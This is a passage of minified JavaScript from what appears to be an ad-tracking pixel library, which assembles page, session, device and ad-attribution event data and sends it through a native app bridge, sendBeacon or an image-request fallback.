          r = this.data.pageInfo,
          o = this.data.pageSign;
        r.url !== e && (n = r.url, this.plugins.forEach(function (t) {
          t.pageUrlWillChange.call(t, r.url, e);
        }), void 0 !== r.url && (r.referrer = r.url), void 0 !== t && (r.referrer = t), o.pageId = Object(v.h)(Z.h), t = o.index + 1, o.index = t, t = t, M(Z.p, {
          index: t
        }), r.url = e, this.plugins.forEach(function (t) {
          t.pageUrlDidChange.call(t, e, n);
        }));
      }, lt.prototype.getCustomData = function (t) {
        var e,
          n,
          t = t.split("."),
          r = this.data.customData;
        try {
          try {
            for (var o = st(t), i = o.next(); !i.done; i = o.next()) r = r[i.value];
          } catch (t) {
            e = {
              error: t
            };
          } finally {
            try {
              i && !i.done && (n = o.return) && n.call(o);
            } finally {
              if (e) throw e.error;
            }
          }
        } catch (t) {
          return null;
        }
        return r;
      }, lt.prototype.setCustomData = function (t, e) {
        var n = t.split("."),
          r = this.data.customData;
        try {
          for (var o = 0; o < n.length; o++) {
            var i = n[o];
            void 0 === r[i] && (r[i] = {}), o === n.length - 1 ? r[i] = e : r = r[i];
          }
        } catch (t) {
          return !1;
        }
        return !0;
      }, lt.prototype.getSessionIdFromCache = function () {
        return null;
      }, lt.prototype.setSessionIdToCache = function (t) {}, lt.prototype.getSessionIndex = function () {
        return -1;
      }, lt.prototype.getVariationId = function () {
        return "";
      }, lt.prototype.isLegacyPixel = function (t) {
        return !1;
      }, lt.prototype.initPageSign = function () {
        var t = this.getSessionIdFromCache();
        return null === t && (t = Object(v.g)(), this.setSessionIdToCache(t)), {
          sessionId: t,
          pageId: Object(v.h)(Z.h),
          variationId: this.getVariationId(),
          index: this.getSessionIndex()
        };
      }, lt.prototype.batchTrackHandler = function (t) {
        var r = this;
        tt(t).forEach(function (t) {
          var e = t.info,
            n = t.data,
            t = e.pixelCode,
            e = e.type;
          r.trackSync(t, "", n, {}, e, z.httpReport);
        });
      }, lt.prototype.isOnSitePage = function () {
        return Object(v.z)() || this.getAllPixels().every(function (t) {
          return t.is_onsite;
        });
      }, lt.prototype.assemblyMergedData = function (t, e, n, r) {
        void 0 === n && (n = {});
        var o = this.getAllPixels(),
          i = this.data.pageSign,
          a = o[0] ? o[0].pixelCode : "",
          o = o.map(function (t) {
            return t.pixelCode;
          }).join("|"),
          r = this.assemblyData(a, t, e, n, r);
        return r.context.pixel && (r.context.pixel.codes = o), r.context.index = i.index, r.context.session_id = i.sessionId, r;
      }, lt.prototype.handlePropertiesToOptions = function (e, t) {
        var n = {};
        return t.forEach(function (t) {
          n[t] = e[t], delete e[t];
        }), n;
      }, lt.prototype.assemblyData = function (t, e, n, r, o) {
        void 0 === r && (r = {});
        var i = Object.assign({}, n),
          a = i && i.pixelMethod;
        i && i.pixelMethod && delete i.pixelMethod;
        var c = this.data,
          u = this.methods.getPixel(t),
          s = c.adInfo,
          f = c.appInfo,
          l = c.pageSign,
          p = c.libraryInfo,
          h = Object.assign({}, p, {
            version: this.isLegacyPixel(t) ? "legacy-" + p.version : p.version
          }),
          s = ct(s, it),
          d = Object.assign({}, s, {
            device_id: f.device_id,
            uid: f.user_id
          }),
          n = this.handlePropertiesToOptions(i, [y.LDU, y.EVENTID, y.EVENT_ID]),
          p = (u && u.options || {}).limited_data_use,
          s = null != n.limited_data_use ? n.limited_data_use : p;
        null == s ? delete n.limited_data_use : n.limited_data_use = !!s;
        p = r && (r.event_id || r.eventID) || "";
        n.event_id = p || n.event_id || n.eventID || "", delete n.eventID;
        s = null == u ? void 0 : u.getPixelMatchedUserFormatInfoV2();
        s && null != i && i.dynamic_parameter_config ? (s.dynamic_parameter_config = null == i ? void 0 : i.dynamic_parameter_config, null == i || delete i.dynamic_parameter_config) : null != i && i.dynamic_parameter_config && (s = {
          dynamic_parameter_config: null == i ? void 0 : i.dynamic_parameter_config
        }, null == i || delete i.dynamic_parameter_config);
        r = u ? u.getUserInfo(b.h.Auto) : {};
        r.auto_trigger_type && (Object.assign(i, {
          auto_trigger_type: r.auto_trigger_type
        }), delete r.auto_trigger_type), Object(g.g)() && Object.assign(i, {
          android_version: f.android_version,
          device_model: f.device_model
        });
        i = {
          event: e,
          message_id: Object(v.f)(Object(v.h)(Z.g), t),
          event_id: p,
          is_onsite: this.isOnSitePage(),
          timestamp: new Date().toJSON(),
          context: {
            ad: d,
            user: Object.assign({
              anonymous_id: c.userInfo.anonymous_id
            }, u && u.getUserInfo(b.h.Manual), r),
            pixel: t ? {
              code: t,
              mode: a,
              runtime: Object(g.d)()
            } : void 0,
            page: c.pageInfo,
            library: h,
            device: {
              platform: f.platform
            },
            session_id: Object(v.f)(c.pageSign.sessionId, t),
            pageview_id: Object(v.f)(c.pageSign.pageId, t),
            variation_id: l.variationId
          },
          _inspection: s,
          signal_diagnostic_labels: u ? u.getSignalDiagnosticLabels() : b.i,
          properties: i
        };
        return Object.assign(i, n);
      }, lt.prototype.assemblySelfHostData = function (t, e, n, r, o) {
        o = this.assemblyData(t, e, n, r = void 0 === r ? {} : r, o);
        return Object(v.t)(t) && Object(v.u)() && (o.context.user.ttp = Object(v.u)()), o;
      }, lt.prototype.pushPrePosition = function (t) {
        this.reportPreposition.push(t);
      }, lt);
    function lt(t) {
      this.plugins = [], this.customMethods = {}, this.batch = new rt({
        handler: this.batchTrackHandler.bind(this)
      }), this.reportPreposition = [], this.data = this.getInitContextData(t), this.methods = this.getInitContextMethods();
    }
    var pt = u("LDkE").default,
      ht = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      dt = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      vt = (yt.prototype.getAdInfo = function () {
        return ht(this, void 0, void 0, function () {
          var e = this;
          return dt(this, function (t) {
            return Object(v.C)(this.jsbridge) || Object(h.a)(d.a.JSB_ERROR, new Error("tt bridge error when getting ad info"), {
              extJSON: {
                position: "getAdInfo"
              }
            }), c(s.AD_INFO_INIT_START), [2, new Promise(function (n) {
              return ht(e, void 0, void 0, function () {
                var e;
                return dt(this, function (t) {
                  switch (t.label) {
                    case 0:
                      return t.trys.push([0, 2,, 3]), [4, this.callAdInfo()];
                    case 1:
                      return (e = t.sent()).ad_info_from = "jsb", e.ad_info_status = e.ad_info_status || "fulfilled", n(e), [3, 3];
                    case 2:
                      return e = t.sent(), n({}), Object(h.a)(d.a.JSB_ERROR, e, {
                        extJSON: {
                          position: "getAdInfo"
                        }
                      }), [3, 3];
                    case 3:
                      return [2];
                  }
                });
              });
            })];
          });
        });
      }, yt.prototype.sendReportData = function (r, o, i) {
        return void 0 === o && (o = "0"), ht(this, void 0, void 0, function () {
          var e, n;
          return dt(this, function (t) {
            return r.category = Z.d, r.tag = Z.f, r.label = Z.e, Object(g.n)() ? Object(g.i)() && i ? (e = {
              eventName: Z.e,
              params: r
            }, [2, this.call("sendLogWithAdInfo", e, this.bridgeTimeout)]) : (n = {
              eventName: Z.f,
              labelName: Z.e,
              value: o,
              extValue: "0",
              extJson: r
            }, [2, this.call("sendLog", n, this.bridgeTimeout)]) : (n = {
              event_name: Z.e,
              version: 2,
              properties: r
            }, [2, this.call("track_event", n, 400)]);
          });
        });
      }, yt.prototype.updatePCMData = function (e) {
        return ht(this, void 0, void 0, function () {
          return dt(this, function (t) {
            return Object(g.n)() && this.call("updatePCMData", e, this.bridgeTimeout), [2];
          });
        });
      }, yt.prototype.updateWebFlData = function (e) {
        return ht(this, void 0, void 0, function () {
          return dt(this, function (t) {
            return Object(g.n)() && Object(g.i)() && this.call("updateFLLocalConv", e, this.bridgeTimeout), [2];
          });
        });
      }, yt.prototype.getATTStatus = function () {
        return ht(this, void 0, void 0, function () {
          var e;
          return dt(this, function (t) {
            switch (t.label) {
              case 0:
                return t.trys.push([0, 2,, 3]), [4, this.call("getATTStatus", {}, this.bridgeTimeout)];
              case 1:
                if (!(e = t.sent()) || !e.data) throw "getATTStatus no data";
                return [2, {
                  ATTStatus: e.data.ATTStatus
                }];
              case 2:
                return t.sent(), [3, 3];
              case 3:
                return [2];
            }
          });
        });
      }, yt.prototype.sendAnalyticsEvent = function (i) {
        return ht(this, void 0, void 0, function () {
          var e, n, r, o;
          return dt(this, function (t) {
            switch (t.label) {
              case 0:
                return e = i.method, n = i.path, r = i.params, o = i.data, [4, this.call("sendAnalyticsEvent", {
                  method: e,
                  path: n,
                  params: r,
                  data: o,
                  header: {
                    "Content-Type": "application/json"
                  }
                }, 0, !1)];
              case 1:
                return [2, t.sent().code];
            }
          });
        });
      }, yt.prototype.callAdInfo = function () {
        return ht(this, void 0, void 0, function () {
          var e;
          return dt(this, function (t) {
            switch (t.label) {
              case 0:
                return t.trys.push([0, 2,, 3]), [4, this.call("adInfo", {}, Object(g.k)() ? 3500 : 5e3)];
              case 1:
                return (e = t.sent()).data ? [2, {
                  creative_id: e.data.cid,
                  log_extra: e.data.log_extra,
                  convert_id: void 0
                }] : [2, Promise.reject("adInfo no data")];
              case 2:
                return "JSBRIDGE TIMEOUT" === (e = t.sent()) ? (Object(h.c)(d.a.CUSTOM_INFO, {
                  custom_name: "ad_info_init_timeout"
                }), [2, {
                  ad_info_status: "timeout"
                }]) : (Object(h.a)(d.a.JSB_ERROR, e, {
                  extJSON: {
                    position: "getAdInfo"
                  }
                }), [2, {}]);
              case 3:
                return [2];
            }
          });
        });
      }, yt.prototype.call = function (o, i, a, c) {
        return void 0 === i && (i = {}), void 0 === a && (a = 400), void 0 === c && (c = !0), ht(this, void 0, void 0, function () {
          var r = this;
          return dt(this, function (t) {
            return [2, new Promise(function (e, t) {
              if (!r.jsbridge) return t("JSBRIDGE ERROR"), void (c && Object(h.a)(d.a.JSB_ERROR, new Error("JSBRIDGE ERROR"), {
                extJSON: {
                  position: "getCallPromise"
                }
              }));
              var n;
              0 < a && (n = window.setTimeout(function () {
                t("JSBRIDGE TIMEOUT"), c && Object(h.a)(d.a.JSB_ERROR, new Error("JSBRIDGE TIMEOUT"), {
                  extJSON: {
                    position: "getCallPromise",
                    method: o
                  }
                });
              }, a)), r.jsbridge.call(o, i, function (t) {
                t = function (t, e) {
                  void 0 === e && (e = !0);
                  var n = {};
                  try {
                    var r, o;
                    "string" == typeof t ? n.data = JSON.parse(t) : !function (t) {
                      return null != t.code && null != t.data && null != t.ret;
                    }(t) ? null != t.code ? (r = Object.assign({}, t), o = r.code, n.code = o, delete r.code, r.data ? n.data = r.data : n.data = r) : n.data = t : (n = t).__data && (n.data = n.__data);
                  } catch (t) {
                    e && Object(h.a)(d.a.JSB_ERROR, t, {
                      extJSON: {
                        position: "getCallPromise bridge.call"
                      }
                    });
                  }
                  return n;
                }(t, c);
                e(t), window.clearTimeout(n);
              });
            })];
          });
        });
      }, yt);
    function yt() {
      var t = u("7u/d").default;
      this.jsbridge = Object(g.n)() ? function () {
        if (window && window.ToutiaoJSBridge && window.ToutiaoJSBridge.call) return window.ToutiaoJSBridge;
      }() || pt : t, this.bridgeTimeout = 400;
    }
    var bt,
      gt = (bt = void 0, function () {
        return bt = void 0 === bt ? Object(g.j)() ? new vt() : null : bt;
      }),
      mt = "_toutiao_params";
    function _t() {}
    var Ot = new (_t.prototype.getAdInfo = function (t) {
        try {
          var e = t || window.location.href,
            n = C("ttclid", e) || void 0,
            r = C("ext_params", e) || void 0,
            o = C(mt, e) || void 0,
            i = parseInt(C("ttuts", e)) || void 0,
            a = o ? JSON.parse(o) : {},
            c = a.log_extra,
            u = void 0 === c ? void 0 : c,
            s = a.idc,
            f = void 0 === s ? void 0 : s,
            l = a.cid,
            p = void 0 === l ? void 0 : l;
          return {
            callback: n,
            ext_params: r,
            log_extra: u,
            creative_id: p,
            idc: f,
            ttuts: i,
            ad_info_from: (u || f || p) && "url"
          };
        } catch (t) {
          return {};
        }
      }, _t.prototype.getAppInfo = function (t) {
        try {
          var e = t || window.location.href,
            n = C(mt, e),
            r = n && JSON.parse(n);
          return {
            device_id: r.device_id,
            user_id: r.uid
          };
        } catch (t) {
          return {};
        }
      }, _t)(),
      Et = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      It = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      wt = (xt.prototype.getAdInfo = function (a) {
        return Et(this, void 0, void 0, function () {
          var e, n, r, o, i;
          return It(this, function (t) {
            switch (t.label) {
              case 0:
                return [4, R(Z.a)];
              case 1:
                return (e = t.sent(), c(s.BEFORE_AD_INFO_INIT_START), null !== e) ? (c(s.AD_INFO_INIT_START), e.ad_info_from = "cache", e.ad_info_status = "fulfilled(cache)", [2, e]) : (n = this.params.getAdInfo(a), this.bridge ? [4, this.bridge.getAdInfo()] : [3, 3]);
              case 2:
                return o = t.sent(), [3, 4];
              case 3:
                o = {}, t.label = 4;
              case 4:
                return r = o, this.bridge && Object(g.l)() ? [4, this.bridge.getATTStatus()] : [3, 6];
              case 5:
                return i = t.sent(), [3, 7];
              case 6:
                i = {}, t.label = 7;
              case 7:
                return (i = Object.assign({}, n, r, i)) && (i.creative_id && i.log_extra || i.callback) && M(Z.a, i), [2, i];
            }
          });
        });
      }, xt);
    function xt() {
      this.bridge = gt(), this.params = Ot;
    }
    var St = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      Pt = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      };
    function Tt() {}
    var At = new (Tt.prototype.send = function (e, n) {
        return St(this, void 0, void 0, function () {
          return Pt(this, function (t) {
            switch (t.label) {
              case 0:
                return [4, this.sendBeacon(e, n)];
              case 1:
                return t.sent() || this.getByImage(e, n), [2];
            }
          });
        });
      }, Tt.prototype.sendBeacon = function (n, r, o) {
        return St(this, void 0, void 0, function () {
          var e;
          return Pt(this, function (t) {
            switch (t.label) {
              case 0:
                return [3, 1];
              case 1:
                return (t.trys.push([1, 4,, 5]), navigator && navigator.sendBeacon) ? !(e = navigator.sendBeacon(n, JSON.stringify(r))) && "number" == typeof o && 0 < o ? (o--, [4, Object(v.H)(200)]) : [3, 3] : [2, !1];
              case 2:
                return t.sent(), [2, this.sendBeacon(n, r, o)];
              case 3:
                return [2, e];
              case 4:
                return t.sent(), [2, !1];
              case 5:
                return [2];
            }
          });
        });
      }, Tt.prototype.getByImage = function (t, e) {
        var n, r;
        new Image().src = (n = e, r = new URL(t), Object.keys(n).forEach(function (t) {
          var e = n[t].toJSON ? n[t].toJSON() : String(n[t]);
          r.searchParams.set(t, e);
        }), r.toString());
      }, Tt)(),
      jt = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      Nt = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      kt = (Rt.prototype.sendReportData = function (i, a, c) {
        var u;
        return jt(this, void 0, void 0, function () {
          var e, n, r, o;
          return Nt(this, function (t) {
            switch (t.label) {
              case 0:
                if (null === this.bridge) return [3, 4];
                e = a.context.ad.creative_id || "0", n = {
                  analytics_message: c,
                  trackLogData: JSON.stringify(a)
                }, o = "timeout" === a.context.ad.ad_info_status, r = {}, t.label = 1;
              case 1:
                return t.trys.push([1, 3,, 4]), [4, this.bridge.sendReportData(n, e, o)];
              case 2:
                if (!(r = t.sent()) || 1 !== r.code) throw new Error("[fetch bridge] sendLog error: code " + (r && r.code) + ", data: " + (r && JSON.stringify(r)));
                return Object(h.c)(d.a.JSB_SEND, {
                  pixelCode: null === (u = a.context.pixel) || void 0 === u ? void 0 : u.code,
                  app_name: Object(g.o)() ? "ultralite" : "",
                  extJSON: {
                    event: a.event,
                    event_id: a.event_id,
                    need_inject_ad_info: o
                  }
                }), [3, 4];
              case 3:
                return o = t.sent(), Object(h.a)(d.a.JSB_ERROR, o, {
                  pixelCode: null === (u = a.context.pixel) || void 0 === u ? void 0 : u.code,
                  custom_name: "sendReportData",
                  custom_enum: r && r.code ? r.code + "" : "non",
                  app_name: Object(g.o)() ? "ultralite" : "",
                  extJSON: {
                    position: "sendReportData"
                  }
                }), Object(g.o)() && Object(g.g)() && this.sendHttpReport(i, a, c), [3, 4];
              case 4:
                return [2];
            }
          });
        });
      }, Rt.prototype.sendHttpReport = function (e, n, r, o, i) {
        var a;
        return void 0 === o && (o = !0), jt(this, void 0, void 0, function () {
          return Nt(this, function (t) {
            switch (t.label) {
              case 0:
                return [4, this.httpService.sendBeacon(e, n, i)];
              case 1:
                return t.sent() || this.httpService.getByImage(e, {
                  analytics_message: r
                }), o && Object(h.c)(d.a.HTTP_SEND, {
                  pixelCode: null === (a = n.context.pixel) || void 0 === a ? void 0 : a.code,
                  extJSON: {
                    event: n.event,
                    event_id: n.event_id
                  }
                }), [2];
            }
          });
        });
      }, Rt.prototype.report = function (c, u, s) {
        return void 0 === s && (s = z.defaultReport), jt(this, void 0, void 0, function () {
          var r, o, i, a;
          return Nt(this, function (t) {
            switch (t.label) {
              case 0:
                if (r = $(u), s === z.defaultReport && null !== this.bridge) return this.sendReportData(c, u, r), [2];
                if (s !== z.httpReport || !this.bridge || !Object(g.n)() || Object(g.m)() || !this.supportSendAnalyticsEvent) return [3, 4];
                o = c, i = void 0, t.label = 1;
              case 1:
                return t.trys.push([1, 3,, 4]), o = new URL(c).pathname, [4, this.bridge.sendAnalyticsEvent({
                  path: o,
                  method: "POST",
                  data: u
                })];
              case 2:
                if (i = t.sent(), a = new Error("sendAnalyticsEvent not support: code " + i + ", path: " + o + ", data: " + JSON.stringify(u)), null == i || -2 == i) throw this.supportSendAnalyticsEvent = !1, a;
                if (1 == i) return [2];
                throw a;
              case 3:
                return a = t.sent(), f.error(a.message), Object(h.a)(d.a.CUSTOM_ERROR, a, {
                  custom_name: "sendAnalyticsEvent",
                  custom_enum: i + ""
                }, !0), [3, 4];
              case 4:
                return this.sendHttpReport(c, u, r, (n = u.event, !(!Boolean(n) || (e = u, !Object.keys((null === (e = null == e ? void 0 : e.context) || void 0 === e ? void 0 : e.user) || {}).some(function (t) {
                  return -1 !== at.c.indexOf(t);
                })))), (e = u.action, Boolean(e) ? 3 : void 0)), [2];
            }
            var e, n;
          });
        });
      }, Rt.prototype.reportPCM = function (e, t, n) {
        var r = this;
        return this.pcmReportList.push(t), this.pcmReportPromise || (this.pcmReportPromise = Promise.resolve().then(function () {
          r.pcmReportList = r.pcmReportList.sort(function (t, e) {
            return e.priority - t.priority;
          });
          var t = r.pcmReportList[0];
          n || null === r.bridge ? r.httpService.sendBeacon(e, t) : r.bridge.updatePCMData(t), r.pcmReportList = [], r.pcmReportPromise = null;
        })), this.pcmReportPromise;
      }, Rt.prototype.reportFL = function (t) {
        null !== this.bridge && this.bridge.updateWebFlData(t);
      }, Rt);
    function Rt() {
      this.pcmReportList = [], this.supportSendAnalyticsEvent = !0, this.bridge = gt(), this.httpService = At;
    }
    var Mt = (Ct.prototype.setPCMDomain = function (t) {
      this.PCMDomain = t;
    }, Ct.prototype.getPCMDomain = function () {
      return this.PCMDomain;
    }, Ct.prototype.setPCMConfig = function (t) {
      t && (t.sort(function (t, e) {
        return e.priority - t.priority;
      }), this.PCMConfig = t);
    }, Ct.prototype.getPCMEvent = function (e, r, t) {
      var n = this;
      void 0 === t && (t = !0);
      try {
        var o = this.PCMConfig;
        return 0 < (o = t ? o.filter(function (t) {
          return t.pixelCode === e && n.endsWith(r.name, t.eventFunnel);
        }) : o).length ? (o = o.filter(function (t) {
          var e = t.revenueMin,
            n = t.revenueMax,
            t = r.value;
          return !(n && 0 < n || e && 0 < e) || null != t && Object(v.J)(t, e, n);
        }))[0] : void 0;
      } catch (t) {
        return;
      }
    }, Ct.prototype.endsWith = function (t, e) {
      e = e.slice().pop();
      return !!e && (e.eventNameReportAliases ? -1 < e.eventNameReportAliases.indexOf(t) : e.eventNameReport === t);
    }, Ct);
    function Ct() {
      this.PCMDomain = "", this.PCMConfig = [];
    }
    var Lt,
      Dt,
      Ft = u("cpc2"),
      e = (Lt = function (t, e) {
        return (Lt = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        Lt(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      });
    function Bt() {
      var e = Dt.call(this) || this;
      return window.track_tool_events && window.track_tool_events.length && window.track_tool_events.forEach(function (t) {
        e.on(t.name, t.callback);
      }), e;
    }
    var Ut = new (Dt = u.n(Ft).a, e(Bt, Dt), Bt.prototype.sendDebugEvent = function (t, e) {
      this.emit("manual_track", {
        pixelCode: t,
        event_type: e,
        id: t + "-" + e
      });
    }, Bt)();
    var Vt = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      Jt = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
